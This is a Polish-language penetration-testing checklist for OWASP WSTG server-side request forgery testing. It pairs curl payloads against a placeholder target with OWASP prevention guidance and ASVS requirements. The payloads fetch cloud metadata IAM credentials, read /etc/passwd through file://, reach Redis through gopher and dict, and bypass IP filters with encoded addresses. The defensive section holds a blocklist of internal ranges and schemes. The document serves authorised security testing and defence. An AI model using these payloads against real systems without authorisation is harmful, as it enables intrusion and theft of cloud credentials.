# WSTG-INPV-19 — Testing for Server-Side Request Forgery (SSRF)

## Cele

- Identify SSRF injection points
- Test if the injection points are exploitable
- Assess the severity of the vulnerability

## KOMENDY

### Podstawowe SSRF

```bash
curl -s "https://TARGET/fetch?url=http://127.0.0.1"
curl -s "https://TARGET/fetch?url=http://localhost"
curl -s "https://TARGET/fetch?url=http://[::1]"
curl -s "https://TARGET/fetch?url=http://0.0.0.0"

```

### SSRF do metadanych chmury

```bash
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

```

### SSRF z roznymi schematami

```bash
curl -s "https://TARGET/fetch?url=file:///etc/passwd"
curl -s "https://TARGET/fetch?url=dict://127.0.0.1:6379/info"
curl -s "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"

```

### SSRF bypass filtrow

```bash
curl -s "https://TARGET/fetch?url=http://2130706433" # decimal IP
curl -s "https://TARGET/fetch?url=http://0x7f000001" # hex IP
curl -s "https://TARGET/fetch?url=http://017700000001" # octal IP
curl -s "https://TARGET/fetch?url=http://127.1"
curl -s "https://TARGET/fetch?url=http://127.0.0.1.nip.io"

```

### Blind SSRF z Burp Collaborator

```bash
curl -s "https://TARGET/fetch?url=http://COLLABORATOR_URL"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings SSRF

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Server Side Request Forgery/README.md
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Server Side Request Forgery/SSRF-Cloud-Instances.md

```

### SecLists SSRF

```bash
# Sprawdz: Desktop/WSTG/SecLists-master/Fuzzing/ pod katem SSRF

```

### Bug-Bounty-Wordlists

```bash
# Referencja: Desktop/WSTG/Bug-Bounty-Wordlists-main/ (sprawdz ssrf-related files)

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry akceptujace URL/URI (url=, path=, src=, redirect=, uri=)
2. Testuj dostep do wewnetrznych serwisow (127.0.0.1, 10.x.x.x, 172.16.x.x)
3. Testuj dostep do metadanych chmury (AWS, GCP, Azure)
4. Sprawdz rozne schematy protokolow (file://, dict://, gopher://)
5. Testuj bypass filtrow (decimal IP, hex IP, DNS rebinding)
6. Uzyj Burp Collaborator do detekcji blind SSRF
7. Sprawdz czy SSRF pozwala na skanowanie portow wewnetrznych


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md

### Case 1 — Aplikacja komunikuje sie z ZNANYMI serwisami (allowlist)

- Uzywaj **allowlist** docelowych IP/domen — to najlepsza obrona gdy cele sa znane
- Waliduj input na warstwie aplikacji:
  - **IP**: uzyj bibliotek do walidacji formatu (Apache Commons Validator, .NET IPAddress.TryParse, JS ip-address)
  - **Domena**: uzyj bibliotek (Java DomainValidator, .NET Uri.CheckHostName, JS is-valid-domain)
  - **URL**: NIE akceptuj pelnych URL od uzytkownika — tylko IP lub domene
- Porownuj zwalidowany IP/domene z allowlista (strict string comparison, case sensitive)
- Wylacz podazanie za **redirectami** w kliencie HTTP — bypass input validation

### Case 2 — Aplikacja komunikuje sie z DOWOLNYMI serwisami (blocklist)

- Gdy allowlist nie jest mozliwy (np. webhooks) — uzywaj blocklist jako minimum
- Blokuj zakresy IP:
  - Localhost: `127.0.0.0/8`, `0.0.0.0/8`, `::1/128`
  - RFC1918 Private: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
  - Link-local: `169.254.0.0/16`
  - Multicast: `224.0.0.0/4`, `ff00::/8`
- Blokuj metadata endpoints chmury:
  - AWS IMDS: `169.254.169.254`, `metadata.amazonaws.com`
  - GCP: `metadata.google.internal`, `169.254.169.254`
  - Azure IMDS: `169.254.169.254`
- Zezwalaj TYLKO na HTTP/HTTPS — blokuj `file://`, `gopher://`, `dict://`, `ftp://`, `phar://`
- Waliduj domene: sprawdz DNS resolution — jesli resolve'uje do prywatnego IP, zablokuj (obrona przed DNS pinning)

### Walidacja IP — uwaga na bypassy

- Sprawdz biblioteki pod katem odpornosci na: Hex encoding (`0x7f000001`), Octal (`0177.0.0.1`), Dword (`2130706433`), URL encoding, Mixed encoding
- Java InetAddressValidator i JS ip-address sa ODPORNE na te bypassy
- .NET IPAddress.TryParse jest PODATNY na Hex, Octal, Dword, Mixed (ale allowlist blokuje bypass)

### Obrona na poziomie sieci

- Firewall rules: ogranicz wychodzacy ruch aplikacji TYLKO do dozwolonych celow
- Segmentacja sieci: zablokuj nielegitymowe polaczenia bezposrednio na poziomie sieci
- AWS: migriuj do **IMDSv2** i wylacz IMDSv1 — IMDSv2 wymaga tokena sesji (PUT request)

### Dodatkowe zabezpieczenia

- Nie podazaj za redirectami slepo — waliduj kazdy URL po przekierowaniu
- Monitoruj allowlist domen — wykrywaj gdy resolve'uja do prywatnych IP (DNS pinning)
- Wymus `Host` header zgodny z oczekiwanym — zapobiega host header injection w SSRF
- Uzyj Semgrep rules do statycznego wykrywania potencjalnych SSRF w kodzie

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Collaborator Everywhere | Wykrywanie SSRF przez out-of-band pingbacki | [GitHub](https://github.com/PortSwigger/collaborator-everywhere) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.6 | Sanitization | Verify that the application protects against Server-side Request Forgery (SSRF) attacks, by validating untrusted data against an allowlist of protocols, domains, paths and ports and sanitizing potentially dangerous characters before using the data to call another service. |
| V13.2.4 | Backend Communication Configuration | Verify that an allowlist is used to define the external resources or systems with which the application is permitted to communicate (e.g., for outbound requests, data loads, or file access). This allowlist can be implemented at the application layer, web server, firewall, or a combination of different layers. |
| V13.2.5 | Backend Communication Configuration | Verify that the web or application server is configured with an allowlist of resources or systems to which the server can send requests or load data or files from. |
| V15.3.2 | Defensive Coding | Verify that where the application backend makes calls to external URLs, it is configured to not follow redirects unless it is intended functionality. |
